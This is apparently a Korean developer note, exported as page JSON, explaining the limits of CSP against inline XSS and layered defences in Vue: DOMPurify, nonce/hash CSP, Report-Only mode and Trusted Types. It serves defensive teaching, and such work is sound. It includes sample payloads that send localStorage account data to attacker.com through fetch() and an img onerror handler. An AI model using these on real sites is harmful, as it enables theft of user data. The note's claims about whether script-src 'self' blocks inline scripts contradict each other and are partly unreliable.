{"pageProps":{"note":{"id":"fof5x2htn0tr6euz2trv2mu","title":"CSP와 inline으로 삽입된 XSS 스크립트의 관계","desc":"","updated":1760334816501,"created":1760334801389,"custom":{},"fname":"dev.web.security.csp-inlined-xss","type":"note","vault":{"fsPath":"vault"},"contentHash":"479c8c90662483ecff2eb312242f48b7","links":[],"anchors":{"csp와-inline으로-삽입된-xss-스크립트의-관계":{"type":"header","text":"CSP와 inline으로 삽입된 XSS 스크립트의 관계","value":"csp와-inline으로-삽입된-xss-스크립트의-관계","line":8,"column":0,"depth":2},"핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가":{"type":"header","text":"핵심 질문: \"inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?\"","value":"핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가","line":10,"column":0,"depth":3},"1-인라인-스크립트와-csp의-한계":{"type":"header","text":"1. 인라인 스크립트와 CSP의 한계","value":"1-인라인-스크립트와-csp의-한계","line":14,"column":0,"depth":2},"csp가-막을-수-없는-경우":{"type":"header","text":"CSP가 막을 수 없는 경우","value":"csp가-막을-수-없는-경우","line":16,"column":0,"depth":3},"2-csp가-효과적인-경우":{"type":"header","text":"2. CSP가 효과적인 경우","value":"2-csp가-효과적인-경우","line":33,"column":0,"depth":2},"csp-설정-예시":{"type":"header","text":"CSP 설정 예시","value":"csp-설정-예시","line":37,"column":0,"depth":3},"csp가-차단하는-것들":{"type":"header","text":"CSP가 차단하는 것들","value":"csp가-차단하는-것들","line":46,"column":0,"depth":3},"3-실제-공격-시나리오에서-csp의-역할":{"type":"header","text":"3. 실제 공격 시나리오에서 CSP의 역할","value":"3-실제-공격-시나리오에서-csp의-역할","line":53,"column":0,"depth":2},"csp가-있을-때-차단되는-것들":{"type":"header","text":"CSP가 있을 때 차단되는 것들","value":"csp가-있을-때-차단되는-것들","line":63,"column":0,"depth":3},"4-올바른-방어-전략-defense-in-depth":{"type":"header","text":"4. 올바른 방어 전략: Defense in Depth","value":"4-올바른-방어-전략-defense-in-depth","line":69,"column":0,"depth":2},"1단계-입력-검증-서버-측":{"type":"header","text":"1단계: 입력 검증 (서버 측)","value":"1단계-입력-검증-서버-측","line":73,"column":0,"depth":3},"2단계-출력-시-sanitization":{"type":"header","text":"2단계: 출력 시 Sanitization","value":"2단계-출력-시-sanitization","line":100,"column":0,"depth":3},"3단계-엄격한-csp-설정":{"type":"header","text":"3단계: 엄격한 CSP 설정","value":"3단계-엄격한-csp-설정","line":117,"column":0,"depth":3},"3-1단계-csp-report-only-모드로-테스트":{"type":"header","text":"3-1단계: CSP Report-Only 모드로 테스트","value":"3-1단계-csp-report-only-모드로-테스트","line":140,"column":0,"depth":3},"5-v-html의-위험성과-대안":{"type":"header","text":"5. v-html의 위험성과 대안","value":"5-v-html의-위험성과-대안","line":151,"column":0,"depth":2},"위험한-코드":{"type":"header","text":"위험한 코드","value":"위험한-코드","line":153,"column":0,"depth":3},"안전한-대안":{"type":"header","text":"안전한 대안","value":"안전한-대안","line":159,"column":0,"depth":3},"6-최신-보안-트렌드-csp-level-3-trusted-types":{"type":"header","text":"6. 최신 보안 트렌드: CSP Level 3 Trusted Types","value":"6-최신-보안-트렌드-csp-level-3-trusted-types","line":202,"column":0,"depth":2},"trusted-types를-사용한-xss-완화":{"type":"header","text":"Trusted Types를 사용한 XSS 완화","value":"trusted-types를-사용한-xss-완화","line":204,"column":0,"depth":3},"결론":{"type":"header","text":"결론","value":"결론","line":246,"column":0,"depth":2},"csp만으로는-불충분하지만-여전히-중요합니다":{"type":"header","text":"CSP만으로는 불충분하지만, 여전히 중요합니다","value":"csp만으로는-불충분하지만-여전히-중요합니다","line":248,"column":0,"depth":3},"보안-체크리스트":{"type":"header","text":"보안 체크리스트","value":"보안-체크리스트","line":268,"column":0,"depth":2},"필수-구현-사항":{"type":"header","text":"필수 구현 사항","value":"필수-구현-사항","line":270,"column":0,"depth":3},"권장-구현-순서":{"type":"header","text":"권장 구현 순서","value":"권장-구현-순서","line":285,"column":0,"depth":3}},"children":[],"parent":"fm8vm79bnyq6fq1gu2oq2zr","data":{}},"body":"<h1 id=\"csp와-inline으로-삽입된-xss-스크립트의-관계\">CSP와 inline으로 삽입된 XSS 스크립트의 관계<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp와-inline으로-삽입된-xss-스크립트의-관계\"></a></h1>\n<h2 id=\"csp와-inline으로-삽입된-xss-스크립트의-관계-1\">CSP와 inline으로 삽입된 XSS 스크립트의 관계<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp와-inline으로-삽입된-xss-스크립트의-관계-1\"></a></h2>\n<h3 id=\"핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가\">핵심 질문: \"inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?\"<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가\"></a></h3>\n<p>답변: <strong>맞습니다, 부분적으로 무용지물이 될 수 있습니다.</strong></p>\n<h2 id=\"1-인라인-스크립트와-csp의-한계\">1. 인라인 스크립트와 CSP의 한계<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#1-인라인-스크립트와-csp의-한계\"></a></h2>\n<h3 id=\"csp가-막을-수-없는-경우\">CSP가 막을 수 없는 경우<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp가-막을-수-없는-경우\"></a></h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&#x3C;!-- v-html로 직접 삽입된 악성 스크립트 --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;</span>div</span> <span class=\"token attr-name\">v-html</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>userContent<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token comment\">// 이 스크립트는 이미 DOM에 삽입되어 실행됨</span>\n    <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://attacker.com/steal\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n      method<span class=\"token operator\">:</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span>\n      body<span class=\"token operator\">:</span> <span class=\"token dom variable\">localStorage</span><span class=\"token punctuation\">.</span><span class=\"token method function property-access\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"accountInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;/</span>div</span><span class=\"token punctuation\">></span></span>\n</code></pre>\n<p>CSP가 <code>script-src 'self'</code>로 설정되어 있어도, <strong>이미 DOM에 삽입된 인라인 스크립트</strong>는 차단되지 않습니다.</p>\n<h2 id=\"2-csp가-효과적인-경우\">2. CSP가 효과적인 경우<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#2-csp가-효과적인-경우\"></a></h2>\n<p>하지만 CSP는 여전히 중요한 방어층입니다:</p>\n<h3 id=\"csp-설정-예시\">CSP 설정 예시<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp-설정-예시\"></a></h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token maybe-class-name\">Content</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Security</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Policy</span><span class=\"token operator\">:</span>\n  <span class=\"token keyword module\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span>\n  script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 인라인 스크립트 차단</span>\n  connect<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 외부 서버 연결 차단</span>\n</code></pre>\n<h3 id=\"csp가-차단하는-것들\">CSP가 차단하는 것들<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp가-차단하는-것들\"></a></h3>\n<ul>\n<li>❌ <code>&#x3C;script src=\"https://evil.com/malicious.js\"></code> - 외부 스크립트 로드</li>\n<li>❌ <code>eval()</code>, <code>Function()</code> 같은 동적 코드 실행</li>\n<li>❌ <code>fetch('https://attacker.com')</code> - 외부 서버로 데이터 전송</li>\n<li>❌ 이벤트 핸들러 속성 (<code>onclick</code>, <code>onerror</code> 등)</li>\n</ul>\n<h2 id=\"3-실제-공격-시나리오에서-csp의-역할\">3. 실제 공격 시나리오에서 CSP의 역할<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#3-실제-공격-시나리오에서-csp의-역할\"></a></h2>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&#x3C;!-- 공격자가 삽입한 XSS --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;</span>img</span>\n  <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>x<span class=\"token punctuation\">\"</span></span>\n  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">'//attacker.com?c='</span><span class=\"token operator\">+</span><span class=\"token dom variable\">localStorage</span><span class=\"token punctuation\">.</span><span class=\"token method function property-access\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">'accountInfo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span>\n<span class=\"token punctuation\">/></span></span>\n</code></pre>\n<h3 id=\"csp가-있을-때-차단되는-것들\">CSP가 있을 때 차단되는 것들<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp가-있을-때-차단되는-것들\"></a></h3>\n<ul>\n<li><code>img-src 'self'</code> → 외부 이미지 로드 차단</li>\n<li><code>connect-src 'self'</code> → attacker.com으로 fetch 차단</li>\n<li><code>script-src 'self'</code> → onerror 인라인 이벤트 핸들러 차단</li>\n</ul>\n<h2 id=\"4-올바른-방어-전략-defense-in-depth\">4. 올바른 방어 전략: Defense in Depth<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#4-올바른-방어-전략-defense-in-depth\"></a></h2>\n<p>단일 방어 메커니즘에 의존하지 않고 <strong>다층 방어</strong>가 필요합니다:</p>\n<h3 id=\"1단계-입력-검증-서버-측\">1단계: 입력 검증 (서버 측)<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#1단계-입력-검증-서버-측\"></a></h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 주의: 기본적인 예시 - 실제로는 불완전함</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">validateInput</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">content</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// HTML 태그 제거 또는 이스케이프</span>\n  <span class=\"token keyword control-flow\">return</span> content<span class=\"token punctuation\">.</span><span class=\"token method function property-access\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&#x3C;script[^>]*>.*?&#x3C;\\/script></span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">gi</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">// ⚠️ 이 방법은 &#x3C;ScRiPt>, &#x3C;script/src=...> 같은 변형을 막지 못함</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// OWASP 권장: 전문 라이브러리 사용</span>\n<span class=\"token keyword module\">import</span> <span class=\"token imports\">validator</span> <span class=\"token keyword module\">from</span> <span class=\"token string\">\"validator\"</span>\n<span class=\"token keyword module\">import</span> <span class=\"token imports\">xss</span> <span class=\"token keyword module\">from</span> <span class=\"token string\">\"xss\"</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">secureValidateInput</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">content</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// HTML 인코딩</span>\n  <span class=\"token keyword\">const</span> encoded <span class=\"token operator\">=</span> validator<span class=\"token punctuation\">.</span><span class=\"token method function property-access\">escape</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">// 또는 XSS 필터링 라이브러리 사용</span>\n  <span class=\"token keyword control-flow\">return</span> <span class=\"token function\">xss</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p><strong>추가 권장사항:</strong></p>\n<ul>\n<li>WAF (Web Application Firewall) 도입 고려</li>\n<li>OWASP AntiSamy, ESAPI 등 검증된 라이브러리 사용</li>\n</ul>\n<h3 id=\"2단계-출력-시-sanitization\">2단계: 출력 시 Sanitization<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#2단계-출력-시-sanitization\"></a></h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword module\">import</span> <span class=\"token imports\"><span class=\"token maybe-class-name\">DOMPurify</span></span> <span class=\"token keyword module\">from</span> <span class=\"token string\">\"dompurify\"</span>\n\n<span class=\"token keyword module\">export</span> <span class=\"token keyword module\">default</span> <span class=\"token punctuation\">{</span>\n  computed<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">safeContent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword control-flow\">return</span> <span class=\"token maybe-class-name\">DOMPurify</span><span class=\"token punctuation\">.</span><span class=\"token method function property-access\">sanitize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token property-access\">userContent</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token constant\">ALLOWED_TAGS</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"i\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"u\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"p\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"br\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token constant\">ALLOWED_ATTR</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<h3 id=\"3단계-엄격한-csp-설정\">3단계: 엄격한 CSP 설정<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#3단계-엄격한-csp-설정\"></a></h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// Nonce 기반 CSP (동적 콘텐츠에 적합)</span>\n<span class=\"token maybe-class-name\">Content</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Security</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Policy</span><span class=\"token operator\">:</span>\n  <span class=\"token keyword module\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'none'</span><span class=\"token punctuation\">;</span>\n  script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> <span class=\"token string\">'nonce-random123'</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 각 요청마다 새로운 nonce 생성</span>\n  style<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> <span class=\"token string\">'unsafe-inline'</span><span class=\"token punctuation\">;</span>\n  img<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> data<span class=\"token operator\">:</span><span class=\"token punctuation\">;</span>\n  connect<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span>\n  frame<span class=\"token operator\">-</span>ancestors <span class=\"token string\">'none'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Hash 기반 CSP (정적 콘텐츠에 적합)</span>\n<span class=\"token maybe-class-name\">Content</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Security</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Policy</span><span class=\"token operator\">:</span>\n  script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> <span class=\"token string\">'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 특정 인라인 스크립트의 SHA-256 해시만 허용</span>\n</code></pre>\n<p><strong>Nonce vs Hash:</strong></p>\n<ul>\n<li><strong>Nonce</strong>: 매 요청마다 서버가 생성하는 랜덤 값. Stored XSS 시 공격자가 nonce를 예측할 수 없어 효과적</li>\n<li><strong>Hash</strong>: 정적 인라인 스크립트의 해시값. 변경되지 않는 코드에 적합</li>\n</ul>\n<h3 id=\"3-1단계-csp-report-only-모드로-테스트\">3-1단계: CSP Report-Only 모드로 테스트<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#3-1단계-csp-report-only-모드로-테스트\"></a></h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 프로덕션 배포 전 테스트</span>\n<span class=\"token maybe-class-name\">Content</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Security</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Policy</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Report</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Only</span><span class=\"token operator\">:</span>\n  <span class=\"token keyword module\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span>\n  script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span>\n  report<span class=\"token operator\">-</span>uri <span class=\"token operator\">/</span>csp<span class=\"token operator\">-</span>violation<span class=\"token operator\">-</span>report<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// CSP 위반 시 차단하지 않고 보고만 함</span>\n</code></pre>\n<h2 id=\"5-v-html의-위험성과-대안\">5. v-html의 위험성과 대안<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#5-v-html의-위험성과-대안\"></a></h2>\n<h3 id=\"위험한-코드\">위험한 코드<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#위험한-코드\"></a></h3>\n<pre class=\"language-vue\"><code class=\"language-vue\">&#x3C;div v-html=\"notice.content\">&#x3C;/div>\n</code></pre>\n<h3 id=\"안전한-대안\">안전한 대안<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#안전한-대안\"></a></h3>\n<pre class=\"language-vue\"><code class=\"language-vue\">&#x3C;!-- 1. 텍스트로만 렌더링 -->\n&#x3C;div v-text=\"notice.content\">&#x3C;/div>\n\n&#x3C;!-- 2. DOMPurify로 정화된 HTML -->\n&#x3C;div v-html=\"sanitizedContent\">&#x3C;/div>\n\n&#x3C;!-- 3. Markdown 파서 사용 (사용자 콘텐츠를 안전하게) -->\n&#x3C;template>\n  &#x3C;div v-html=\"parsedMarkdown\">&#x3C;/div>\n&#x3C;/template>\n\n&#x3C;script>\nimport marked from \"marked\"\nimport DOMPurify from \"dompurify\"\n\nexport default {\n  computed: {\n    parsedMarkdown() {\n      // Markdown을 HTML로 변환 후 정화\n      const rawHtml = marked.parse(this.userContent)\n      return DOMPurify.sanitize(rawHtml)\n    },\n  },\n}\n&#x3C;/script>\n\n&#x3C;!-- 4. 코드 하이라이팅이 필요한 경우 -->\n&#x3C;script>\nimport hljs from \"highlight.js\"\nimport DOMPurify from \"dompurify\"\n\n// DOMPurify 훅 추가로 코드 블록 안전하게 처리\nDOMPurify.addHook(\"afterSanitizeAttributes\", (node) => {\n  if (node.tagName === \"CODE\") {\n    hljs.highlightElement(node)\n  }\n})\n&#x3C;/script>\n</code></pre>\n<h2 id=\"6-최신-보안-트렌드-csp-level-3-trusted-types\">6. 최신 보안 트렌드: CSP Level 3 Trusted Types<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#6-최신-보안-트렌드-csp-level-3-trusted-types\"></a></h2>\n<h3 id=\"trusted-types를-사용한-xss-완화\">Trusted Types를 사용한 XSS 완화<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#trusted-types를-사용한-xss-완화\"></a></h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// CSP에 Trusted Types 정책 추가</span>\n<span class=\"token maybe-class-name\">Content</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Security</span><span class=\"token operator\">-</span><span class=\"token maybe-class-name\">Policy</span><span class=\"token operator\">:</span>\n  require<span class=\"token operator\">-</span>trusted<span class=\"token operator\">-</span>types<span class=\"token operator\">-</span><span class=\"token keyword control-flow\">for</span> <span class=\"token string\">'script'</span><span class=\"token punctuation\">;</span>\n  trusted<span class=\"token operator\">-</span>types myPolicy<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// JavaScript에서 Trusted Types 정책 생성</span>\n<span class=\"token keyword control-flow\">if</span> <span class=\"token punctuation\">(</span><span class=\"token dom variable\">window</span><span class=\"token punctuation\">.</span><span class=\"token property-access\">trustedTypes</span> <span class=\"token operator\">&#x26;&#x26;</span> trustedTypes<span class=\"token punctuation\">.</span><span class=\"token property-access\">createPolicy</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> myPolicy <span class=\"token operator\">=</span> trustedTypes<span class=\"token punctuation\">.</span><span class=\"token method function property-access\">createPolicy</span><span class=\"token punctuation\">(</span><span class=\"token string\">'myPolicy'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">createHTML</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">input</span><span class=\"token punctuation\">)</span> <span class=\"token arrow operator\">=></span> <span class=\"token punctuation\">{</span>\n      <span class=\"token comment\">// DOMPurify로 정화 후 TrustedHTML 반환</span>\n      <span class=\"token keyword control-flow\">return</span> <span class=\"token maybe-class-name\">DOMPurify</span><span class=\"token punctuation\">.</span><span class=\"token method function property-access\">sanitize</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">createScript</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">input</span><span class=\"token punctuation\">)</span> <span class=\"token arrow operator\">=></span> <span class=\"token punctuation\">{</span>\n      <span class=\"token comment\">// 스크립트는 완전히 차단</span>\n      <span class=\"token keyword control-flow\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Scripts not allowed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Vue.js와 결합</span>\n<span class=\"token keyword module\">export</span> <span class=\"token keyword module\">default</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token function\">mounted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Trusted Types가 적용되면 innerHTML 직접 할당이 차단됨</span>\n    <span class=\"token comment\">// this.$el.innerHTML = userContent; // ❌ 차단됨</span>\n\n    <span class=\"token comment\">// 정책을 통해서만 가능</span>\n    <span class=\"token keyword control-flow\">if</span> <span class=\"token punctuation\">(</span><span class=\"token dom variable\">window</span><span class=\"token punctuation\">.</span><span class=\"token property-access\">myPolicy</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token property-access\">$el</span><span class=\"token punctuation\">.</span><span class=\"token property-access\">innerHTML</span> <span class=\"token operator\">=</span> myPolicy<span class=\"token punctuation\">.</span><span class=\"token method function property-access\">createHTML</span><span class=\"token punctuation\">(</span>userContent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p><strong>장점:</strong></p>\n<ul>\n<li>DOM XSS sink(innerHTML, outerHTML 등)를 근본적으로 차단</li>\n<li>Vue.js의 v-html도 Trusted Types 정책 적용 가능</li>\n<li>브라우저 레벨에서 XSS 방지</li>\n</ul>\n<h2 id=\"결론\">결론<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#결론\"></a></h2>\n<h3 id=\"csp만으로는-불충분하지만-여전히-중요합니다\">CSP만으로는 불충분하지만, 여전히 중요합니다<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#csp만으로는-불충분하지만-여전히-중요합니다\"></a></h3>\n<ol>\n<li>\n<p><strong>CSP의 한계</strong>:</p>\n<ul>\n<li>Stored XSS로 이미 삽입된 인라인 스크립트는 막기 어려움</li>\n<li>특히 <code>unsafe-inline</code>을 허용하면 거의 무용지물</li>\n</ul>\n</li>\n<li>\n<p><strong>그래도 CSP가 필요한 이유</strong>:</p>\n<ul>\n<li>외부 리소스 로드 차단</li>\n<li>데이터 유출 경로 차단</li>\n<li>공격의 영향 범위 제한</li>\n</ul>\n</li>\n<li>\n<p><strong>올바른 접근 방법</strong>:</p>\n<ul>\n<li><strong>입력 검증</strong> (서버 측) - OWASP 권장 라이브러리 사용</li>\n<li><strong>출력 인코딩/Sanitization</strong> (클라이언트 측)</li>\n<li><strong>엄격한 CSP</strong> (추가 방어층) - Nonce/Hash 활용</li>\n<li><strong>v-html 사용 최소화</strong> - Markdown 파서 등 대안 활용</li>\n<li><strong>Trusted Types</strong> (최신 브라우저) - DOM XSS 근본 차단</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"보안-체크리스트\">보안 체크리스트<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#보안-체크리스트\"></a></h2>\n<h3 id=\"필수-구현-사항\">필수 구현 사항<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#필수-구현-사항\"></a></h3>\n<ul class=\"contains-task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> CSP (Content Security Policy) 설정\n<ul class=\"contains-task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Nonce 또는 Hash 기반 정책 적용</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Report-Only 모드로 테스트 후 적용</li>\n</ul>\n</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> <code>v-html</code> 사용 위치 전수 검사</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> 서버 측 입력 검증\n<ul class=\"contains-task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> OWASP 권장 라이브러리 (validator.js, xss 등) 사용</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> WAF 도입 검토</li>\n</ul>\n</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> 클라이언트 측 Sanitization\n<ul class=\"contains-task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> DOMPurify 라이브러리 적용</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Markdown 파서 사용 시 정화 적용</li>\n</ul>\n</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> CSP Level 3 Trusted Types 도입 (모던 브라우저)</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" checked disabled> HttpOnly 쿠키 사용 고려 (CSRF 복잡도 vs localStorage)</li>\n</ul>\n<h3 id=\"권장-구현-순서\">권장 구현 순서<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#권장-구현-순서\"></a></h3>\n<ol>\n<li><strong>즉시</strong>: v-html 제거 또는 DOMPurify 적용</li>\n<li><strong>단기</strong>: 서버 측 입력 검증 강화</li>\n<li><strong>중기</strong>: CSP Report-Only 모드 테스트</li>\n<li><strong>장기</strong>: Trusted Types 도입</li>\n</ol>\n<blockquote>\n<p><strong>핵심</strong>: v-html을 제거하거나 Sanitization을 적용하는 것이 CSP보다 더 근본적인 해결책입니다. CSP는 추가적인 방어층으로 활용해야 합니다. <strong>Defense in Depth</strong> 전략으로 